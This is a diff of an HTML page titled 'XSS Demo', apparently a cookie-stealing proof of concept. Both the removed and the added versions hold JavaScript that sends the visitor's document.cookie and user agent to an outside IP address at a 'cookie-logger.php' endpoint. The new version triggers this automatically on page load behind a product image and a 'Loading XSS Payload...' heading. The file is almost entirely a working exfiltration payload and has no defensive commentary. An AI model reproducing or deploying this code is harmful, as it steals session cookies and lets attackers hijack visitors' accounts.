@@ -1,60 +1,35 @@
 <!DOCTYPE html>
 <html>
-<body style="margin:0">
-  <!-- <a href="/product/123" style="display:block">  -->
-    <a id="myLink" href="/product/123" style="display:block"></a>
-    <img src="https://akn-ss.a-cdn.akinoncloud.com/products/2021/09/15/314248/f8398d46-fc92-4498-8790-f3bbed8c57ff_size3840_cropCenter.jpg" 
-         style="width:100%">
-  </a>
-
-  <!--
-  <script>
- 
-    document.querySelector('a').addEventListener('click', async function(e) {
-      e.preventDefault();
-      
-      await fetch('http://16.171.42.24', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          victim_cookie: document.cookie,
-          user_agent: navigator.userAgent
-        }),
-        mode: 'no-cors' 
-      });
-      
-
-      window.location.href = this.href;
+<head>
+  <meta charset="UTF-8">
+  <title>XSS Demo</title>
+</head>
+<body onload="(async () => {
+  try {
+    await fetch('http://16.171.42.24/cookie-logger.php', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      credentials: 'include', 
+      body: JSON.stringify({
+        victim_cookie: document.cookie,
+        user_agent: navigator.userAgent
+      })
     });
-  </script>
+  } catch (err) {
+    console.log('Fetch error:', err);
+  }
+})()">
 
--->
+  <!-- İstenen görsel -->
+  <img 
+    src="https://akn-ss.a-cdn.akinoncloud.com/products/2021/09/15/314248/f8398d46-fc92-4498-8790-f3bbed8c57ff_size3840_cropCenter.jpg"
+    style="width:100%;"
+    alt="Görsel"
+  />
 
-<script>
-  document.getElementById('myLink').addEventListener('click', async function(e) {
-    e.preventDefault();
-    try {
-      await fetch("http://16.171.42.24/cookie-logger.php", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        credentials: "include",
-
-        body: JSON.stringify({
-          victim_cookie: document.cookie,
-          user_agent: navigator.userAgent
-        })
-      });
-      
-
-    } catch(err) {
-      console.log("Fetch error:", err);
-    }
-
-    window.location.href = this.href;
-  });
-</script>
+  <h1>Loading XSS Payload...</h1>
 
 </body>
 </html>
